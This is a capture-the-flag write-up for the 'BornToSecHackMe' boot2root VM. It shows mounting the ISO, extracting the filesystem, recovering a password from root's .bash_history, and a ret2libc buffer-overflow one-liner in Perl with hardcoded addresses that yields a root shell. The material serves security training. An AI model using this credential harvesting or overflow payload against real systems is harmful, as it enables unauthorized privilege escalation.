# ISO file exploration

## Step 1. Mount ISO file
Since we are given an ISO file to exploit, we can just mount it to see what's inside there.
```shell
┌──(kali㉿kali)-[~/boot2root]
└─$ sudo mkdir /mnt/iso
┌──(kali㉿kali)-[~/boot2root]
└─$ sudo mount BornToSecHackMe-v1.1.iso /mnt/iso
mount: /mnt/iso: WARNING: source write-protected, mounted read-only.
```

## Step 2. Extract filesystem
```shell
┌──(kali㉿kali)-[~/boot2root]
└─$ sudo unsquashfs -d ./fs /mnt/iso/casper/filesystem.squashfs
Parallel unsquashfs: Using 2 processors
61188 inodes (56421 blocks) to write

[===========================================================================/] 56421/56421 100%

created 54391 files
created 8445 directories
created 6743 symlinks
created 2 devices
created 2 fifos
created 28 sockets

┌──(kali㉿kali)-[~/boot2root]
└─$ sudo chown -R kali:kali fs
```
After mounting the ISO file, we found a file `filesystem.squashfs` which is a compressed read-only file system for Linux.</br> 
[`unsquashfs`](https://manpages.debian.org/testing/squashfs-tools/unsquashfs.1.en.html) command can be used to extract the whole filesystem.

## Step 3. Explore filesystem
```shell
┌──(kali㉿kali)-[~/boot2root/fs/root]
└─$ grep -A 1 adduser .bash_history
[...]
adduser zaz
646da671ca01bb5d84dbb5fb2238dc8e
[...]
```
Now we can access all the files of the system including files in the `/root`. By inspecting `.bash_history` of root user, we found that root user accidentally typed zaz's password twice while executing `adduser`.

## Step 4. SSH zaz
With the SSH password of `zaz`, we can exploit the system just like the final step of [writeup1](https://github.com/4slan/boot2root/blob/main/writeup1.md#ssh-zaz---bofret2libc).
```shell
zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# whoami
root
```
